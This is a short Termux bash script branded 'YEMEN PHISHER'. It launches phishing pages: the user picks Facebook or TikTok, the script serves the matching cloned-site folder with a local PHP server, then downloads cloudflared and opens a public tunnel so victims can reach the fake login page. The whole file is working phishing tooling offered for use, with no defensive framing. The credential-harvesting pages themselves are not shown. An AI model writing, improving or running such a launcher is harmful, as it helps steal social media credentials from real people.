
#!/data/data/com.termux/files/usr/bin/bash
clear
echo "███████╗██╗░░░██╗███████╗███╗░░██╗███████╗███╗░░██╗░██████╗░███████╗██████╗░"
echo "██╔════╝██║░░░██║██╔════╝████╗░██║██╔════╝████╗░██║██╔════╝░██╔════╝██╔══██╗"
echo "█████╗░░██║░░░██║█████╗░░██╔██╗██║█████╗░░██╔██╗██║██║░░██╗░█████╗░░██████╔╝"
echo "██╔══╝░░██║░░░██║██╔══╝░░██║╚████║██╔══╝░░██║╚████║██║░░╚██╗██╔══╝░░██╔═══╝░"
echo "██║░░░░░╚██████╔╝███████╗██║░╚███║███████╗██║░╚███║╚██████╔╝███████╗██║░░░░░"
echo "╚═╝░░░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░░░░"
echo "               [ YEMEN PHISHER ]  Termux Edition"
echo

echo "[1] Facebook"
echo "[2] TikTok"
read -p "Select target site: " opt

if [ $opt -eq 1 ]; then
  cd sites/facebook
elif [ $opt -eq 2 ]; then
  cd sites/tiktok
else
  echo "Invalid option"; exit
fi

echo "[*] Starting PHP server..."
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

echo "[*] Downloading Cloudflared..."
curl -s https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -L -o cloudflared
chmod +x cloudflared

echo "[*] Starting Cloudflared tunnel..."
./cloudflared tunnel --url http://127.0.0.1:8080
